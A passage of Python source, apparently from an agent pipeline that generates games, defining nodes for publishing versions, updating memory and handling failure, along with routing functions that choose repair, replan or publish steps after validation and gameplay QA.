        "status": "succeeded",
        "game_id": game_id,
        "version_id": version_id,
        "manifest_url": manifest_url,
        "preview_url": f"/play/{game_id}",
        "_agent": "PublishArtifactAgent",
        "_logs": [
            f"uploaded files: {', '.join(file.get('path', '?') for file in state.get('generated_files') or [])}",
            f"manifest url: {manifest_url}",
            f"game id: {game_id}",
            f"version id: {version_id}",
            "database saved: game + game_version with preview status",
        ],
    }


def publish_revision_node(state: dict) -> dict:
    from app.services import packaging

    game_id, version_id, version, manifest_url = packaging.publish_revision(state)
    return {
        "status": "succeeded",
        "game_id": game_id,
        "version_id": version_id,
        "manifest_url": manifest_url,
        "preview_url": f"/play/{game_id}",
        "_agent": "PublishRevisionAgent",
        "_logs": [
            f"incremental files: {', '.join((state.get('revision_result') or {}).get('changed_files') or [])}",
            f"saved preview version: {version}",
            f"manifest url: {manifest_url}",
            "previous version retained for rollback",
        ],
    }


def memory_update_node(state: dict) -> dict:
    from app.db.session import SessionLocal
    from app.services import memory as memory_service

    task_id = state.get("task_id")
    if not task_id:
        return {
            "_agent": "MemoryUpdateAgent",
            "_logs": ["memory update skipped: missing task id"],
        }
    db = SessionLocal()
    try:
        created = memory_service.capture_success_memories(db, task_id=task_id, state=state)
        db.commit()
    except Exception as exc:  # noqa: BLE001
        db.rollback()
        return {
            "_agent": "MemoryUpdateAgent",
            "_logs": [f"memory update failed open: {_clip(exc, 160)}"],
        }
    finally:
        db.close()
    return {
        "_agent": "MemoryUpdateAgent",
        "_logs": [
            f"stored memory items: {len(created)}",
            "memory update is non-blocking; generation result already persisted",
        ]
        + [
            f"- {item.scope_type}/{item.category}: {_clip(item.raw_text, 120)}"
            for item in created[:5]
        ],
    }


def failed_node(state: dict) -> dict:
    msg = state.get("error_message") or state.get("last_error") or "generation failed"
    return {
        "status": "failed",
        "error_message": msg,
        "_agent": "FailureHandler",
        "_logs": [
            f"task failed: {_clip(msg, 220)}",
            f"repair attempts used: {state.get('repair_attempts', 0)}/{MAX_REPAIR}",
            f"gameplay repair attempts used: {state.get('gameplay_repair_attempts', 0)}/{MAX_GAMEPLAY_REPAIR}",
            f"replan attempts used: {state.get('replan_attempts', 0)}/{MAX_REPLAN}",
        ],
    }


def done_node(state: dict) -> dict:
    return {
        "status": "succeeded",
        "_agent": "DoneHandler",
        "_logs": [f"generation succeeded for game_id={state.get('game_id', 'unknown')}", f"preview url: {state.get('preview_url', 'pending')}"],
    }


def should_continue_after_safety(state: dict) -> str:
    if state.get("status") == "failed":
        return "failed"
    return "memory_retrieval"


def next_after_memory_retrieval(state: dict) -> str:
    return "feedback_understanding" if state.get("task_kind") == "revision" else "intent_spec"


def should_continue_after_validation(state: dict) -> str:
    if state.get("task_kind") == "revision":
        if (state.get("validation_result") or {}).get("valid"):
            return "gameplay_qa"
        return "revision_repair" if state.get("repair_attempts", 0) < MAX_REPAIR else "failed"
    if (state.get("validation_result") or {}).get("valid"):
        return "gameplay_qa"
    if state.get("repair_attempts", 0) < MAX_REPAIR:
        return "repair_code"
    if state.get("replan_attempts", 0) < MAX_REPLAN:
        return "replan_game_design"
    return "failed"


def should_continue_after_gameplay_qa(state: dict) -> str:
    if state.get("task_kind") == "revision":
        if (state.get("gameplay_qa_result") or {}).get("passed"):
            return "publish_revision"
        return "revision_repair" if state.get("repair_attempts", 0) < MAX_REPAIR else "failed"
    if (state.get("gameplay_qa_result") or {}).get("passed"):
        return "publish_artifact"
    if state.get("gameplay_repair_attempts", 0) < MAX_GAMEPLAY_REPAIR:
        return "gameplay_repair"
    if state.get("replan_attempts", 0) < MAX_REPLAN:
        return "replan_game_design"
    return "failed"
